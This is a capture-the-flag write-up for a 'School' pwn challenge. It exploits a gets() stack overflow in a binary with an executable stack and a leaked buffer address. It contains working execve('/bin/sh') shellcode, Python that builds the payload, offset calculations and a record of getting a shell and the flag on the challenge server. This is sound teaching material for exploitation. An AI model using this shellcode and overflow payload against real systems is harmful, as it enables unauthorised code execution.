Writeup for [[School]]
Location: `nc offsec-chalbroker.osiris.cyber.nyu.edu 1338`
Download: `school`
Flag: `flag{first_day_of_pwn_school}`
Lore: Shellcode

###### First Run:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ./school      
Let's go to school! School's at: 0x7ffcfdb98500. gimme directions:
Skip school!
Hi, Skip school!
```

It reveals an address, knew that I had to test it....but nothing happened
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ./school
Let's go to school! School's at: 0x7ffd79eaaa30. gimme directions:
0x7ffcfdb98500
Hi, 0x7ffcfdb98500
```

Address appears to be a leaked stack address based on formatting/how it changes (those addresses are dynamic)

In fact, we're starting to hope it's the stack, because that bitch is executable
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ~/.local/bin/pwn checksec ./school    
[*] '/home/kali/Desktop/5-Week/school'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```
The `rwx` means that some parts of the program can be read, written, and executed, which is a bad choice on their part
###### Confirmed with vmmap
```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/kali/Desktop/5-Week/school
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/kali/Desktop/5-Week/school
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/kali/Desktop/5-Week/school

0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
```

Looking at main method, confirmed that it does function similarly to Backdoor
```c
undefined8 main(EVP_PKEY_CTX *param_1){
  char data [32];
  init(param_1);
  printf("Let\'s go to school! School\'s at: %p. gimme directions:\n",data);
  gets(data);
  printf("Hi, %s\n",data);
  return 0;
}
```

Unfortunately, no fun functions like Backdoor had
![[Pasted image 20240306113802.png]]
We don't even see system imported like we saw there:
![[Pasted image 20240306113831.png]]

So, let's spam it with input until we get a segfault
###### Fault happens 40 char in:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 School_Pwn1.py
[+] Starting local process './school': pid 1284615
[*] Process './school' stopped with exit code -11 (SIGSEGV) (pid 1284615)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/5-Week/core.1284615'
    Arch:      amd64-64-little
    RIP:       0x400681
    RSP:       0x7ffe9fe27878
    Exe:       '/home/kali/Desktop/5-Week/school' (0x400000)
    Fault:     0x6161616c6161616b
[*] rsp = 0x7ffe9fe27878
[*] rip offset = 40
```

We see some of the data leak into our stack and registers too:
```
$rax   : 0x0               
$rbx   : 0x00007fffffffdee8  →  0x00007fffffffe250  →  "/home/kali/Desktop/5-Week/school"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffddd8  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00007fffffffdc00  →  "Hi, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaala[...]"
```
`rbp` is overwritten

Data fills up the stack:
```
0x00007fffffffddd8│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"    ← $rsp
0x00007fffffffdde0│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x00007fffffffdde8│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
...omitted for brevity...
```

What is in our leaked address?
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ pwn cyclic 100 > inp
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ gdb ./school -q
gef➤  r < inp
Let's go to school! School's at: 0x7fffffffddb0. gimme directions:
Hi, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
gef➤  x 0x7fffffffddb0
0x7fffffffddb0: 0x61616161

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400681 in main ()
```

And we can see that `rbp` is overwritten (just like in Backdoor) at 32 characters and the top of the stack is overwritten at 40. That leaked address seems to point to the beginning of where the data is stored
###### Offsets
```python
>>> cyclic_find('iaaa') # Value stored in RBP
32
>>> cyclic_find('kaaa') # Value stored at top of stack
40
>>> cyclic_find(b'\x61\x61\x61\x61') # Value stored in leaked address
0
```

The leaked address is a part of the executable stack memory, so if we jump there, the program will execute whatever is there. We control that data, meaning we can give it code to execute.
### Payload Building
To exploit, we'll need a payload made up of 40 characters or less of shellcode, padding, and that leaked address

### Shellcode
Shellcode has to fit in 40 bytes of space.
##### Shellcraft Payload Too Long, but can give us a start
###### Python to put in appendix with other example shellcode:
```python
>>> print(shellcraft.amd64.linux.sh())
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
```
###### Shellcraft info
```python
>>> print(asm(shellcraft.sh()))
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
>>> print(len(asm(shellcraft.sh())))
44
```

How do we make this smaller:
```
/* push b'/bin///sh\x00' */
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
```
This part pushes an "h"
then `/bin///s`


It also pushes the argument array separately, but it is a part of the original data, maybe we can just push the pointer to sh+NULL
This part pushes 'sh' followed by a nulll terminator
```
/* push b'sh\x00' */
push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
xor esi, esi /* 0 */
push rsi /* null terminate */
```
then it increases the stack pointer by the length of `b'/bin///sh\x00'` so it points to the new data, then saves that pointer into rsi before pushing it on the stack and rewriting rsi to rbp
```
push 8
pop rsi
add rsi, rsp
push rsi /* 'sh\x00' */
mov rsi, rsp
```
Then finally calls execute


To make it smaller, can we point the `argv` pointer to `bin/sh`? the `/sh` should be the top value on the stack
Push null terminator
```
xor rsi,rsi
push rsi
```
Push b'/bin//sh
```
mov rdi,0x68732f2f6e69622f
push rdi
```
Then push that

At this point, we see the data in our registers and stack
```
   0x7fffffffddd0:                 xor    rsi,rsi
   0x7fffffffddd3                  push   rsi
   0x7fffffffddd4                  movabs rdi, 0x68732f2f6e69622f
   0x7fffffffddde                  push   rdi
●→ 0x7fffffffdddf                  push   rsp

$rsp   : 0x00007fffffffddf0  →  "/bin//sh"
$rsi   : 0x0               
$rdi   : 0x68732f2f6e69622f ("/bin//sh"?)

stack ────
0x00007fffffffddf0│+0x0000: "/bin//sh"     ← $rsp
```

Then, push the stack pointer, which points to `/bin//sh` and save in `rdi`
At that point:
```
   0x7fffffffdddf                  push   rsp
   0x7fffffffdde0                  pop    rdi
●→ 0x7fffffffdde1                  push   0x3b

 registers ────
$rax   : 0x0               
$rsp   : 0x00007fffffffddf0  →  "/bin//sh"
$rsi   : 0x0               
$rdi   : 0x00007fffffffddf0  →  "/bin//sh"

stack ────
0x00007fffffffddf0│+0x0000: "/bin//sh"     ← $rsp, $rdi
```

Finally, save the syscall number in `rax` before the call
At that point:
```
   0x7fffffffdde1                  push   0x3b
   0x7fffffffdde3                  pop    rax
   0x7fffffffdde4                  cdq    
●→ 0x7fffffffdde5                  syscall 


registers ────
$rax   : 0x3b              
$rsp   : 0x00007fffffffddf0  →  "/bin//sh"
$rsi   : 0x0               
$rdi   : 0x00007fffffffddf0  →  "/bin//sh"


stack ────
0x00007fffffffddf0│+0x0000: "/bin//sh"     ← $rsp, $rdi
```

And it runs! Yay

Here is the shellcode:
```
xor rsi,rsi
push rsi
mov rdi,0x68732f2f6e69622f
push rdi
push rsp
pop rdi
push 0x3b
pop rax
cdq
syscall
```

References available in Appendix


# Building Payload

Payload made up of
```
[Shellcode] + [Padding] + [Addr]
```

Build Payload:
```python
def buildPld(a):
	code = b'\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\x6A\x3B\x58\x99\x0F\x05'
	p = 40 - len(code)
	pad = b'A'*p
	addr = p64(int(a, 16))
	return code + pad + addr
```

Shellcode is the hex-encoded shellcode

Padding fills so that whole buffer is 40 chars


Code to get leaked address:
```python
def getAddr(p):
	p.recvuntil("at: ")
	a = cleanLine(p.recvuntil("."))
	ad =  re.split("\.", a)
	return ad[0]
```

Code for testing:
```python
def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./school -q')
	p.sendline("break *0x0000000000400681")
	p.sendline("r")
	addr = getAddr(p)
	p.recvuntil("directions:")
	p.sendline(buildPld(addr))
	p.interactive()
```

Can see the code we injected after the return!
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 School_Pwn.py
[*] Switching to interactive mode
Hi, H1\xf6VH\xbf/bin//shWT_j;X\x99\x0f\x05AAAAAAAAAAAAAAAAA\xd0\xdd\xff\xff\xff\x7f

Breakpoint 1, 0x0000000000400681 in main ()
 →   0x400681 <main+80>        ret    
   ↳  0x7fffffffddd0                  xor    rsi, rsi
      0x7fffffffddd3                  push   rsi
      0x7fffffffddd4                  movabs rdi, 0x68732f2f6e69622f
      0x7fffffffddde                  push   rdi
      0x7fffffffdddf                  push   rsp
      0x7fffffffdde0                  pop    rdi
```
And it works when we continue!
```
gef➤  $ c
Continuing.
process 175805 is executing new program: /usr/bin/dash
```

Exploitation:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 School_Pwn.py
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1338: Done
[*] Switching to interactive mode

Hi, H1\xf6VH\xbf/bin//shWT_j;X\x99\x0f\x05AAAAAAAAAAAAAAAAAЖ\x06s\xfc
$ whoami
pwn
$ pwd
/home/pwn
$ ls
flag.txt
school
$ cat flag.txt
flag{first_day_of_pwn_school}
```

